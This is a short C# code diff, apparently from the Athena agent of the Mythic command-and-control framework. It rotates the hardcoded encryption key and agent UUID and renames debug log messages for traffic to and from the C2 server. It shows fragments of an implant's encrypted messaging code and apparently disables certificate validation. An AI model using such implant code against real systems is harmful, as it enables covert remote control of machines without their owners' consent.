@@ -56,8 +56,8 @@ namespace Athena
             this.proxyHost = ":";
             this.proxyPass = "q";
             this.proxyUser = "";
-            this.psk = "8hXHQhI7lktRDIwCg47bsFcTHz6wGPMApKa7vJRE8X0=";
-            this.uuid = "b0f09c61-c1aa-4b0a-bebf-e0c4660f8cef";
+            this.psk = "qPoh3l1U0rxnF9tHYpSL8LnhRmfVqTUNh6NkebHFMLw=";
+            this.uuid = "56e59d4e-674c-41b1-ad88-c22bdcb108b7";
 
             //Might need to make this configurable
             ServicePointManager.ServerCertificateValidationCallback =
@@ -109,7 +109,7 @@ namespace Athena
         {
             try
             {
-                Debug.WriteLine($"[{DateTime.Now}] Message to Mythic: {json}");
+                Debug.WriteLine($"[{DateTime.Now}] Athena -> Mythic: {json}");
                 if (this.encrypted)
                 {
                     json = this.crypt.Encrypt(json);
@@ -138,13 +138,13 @@ namespace Athena
 
                 if (this.encrypted)
                 {
-                    Debug.WriteLine($"[{DateTime.Now}] Message from Mythic: {this.crypt.Decrypt(strRes)}");
+                    Debug.WriteLine($"[{DateTime.Now}] Mythic -> Athena: {this.crypt.Decrypt(strRes)}");
                     return this.crypt.Decrypt(strRes);
                 }
 
                 if (!string.IsNullOrEmpty(strRes))
                 {
-                    Debug.WriteLine($"[{DateTime.Now}] Message from Mythic: {Misc.Base64Decode(strRes).Result.Substring(36)}");
+                    Debug.WriteLine($"[{DateTime.Now}] Mythic -> Athena: {Misc.Base64Decode(strRes).Result.Substring(36)}");
                     return (await Misc.Base64Decode(strRes)).Substring(36);
                 }
 
